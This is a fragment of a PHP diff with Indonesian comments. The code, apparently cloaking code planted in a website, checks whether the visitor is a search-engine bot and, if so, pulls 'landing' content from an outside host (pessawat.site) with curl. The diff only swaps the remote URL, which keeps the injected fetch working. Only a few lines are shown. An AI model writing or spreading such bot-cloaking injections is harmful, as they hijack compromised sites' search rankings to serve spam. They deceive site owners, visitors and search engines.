@@ -17,7 +17,7 @@ foreach($bots as $bot) {
 
 if($is_bot) {
     // Ambil konten landing
-    $url = 'https://pessawat.site/iyaisoo/index.html';
+    $url = 'https://pessawat.site/icaica';
     
     // Pake curl
     $ch = curl_init();
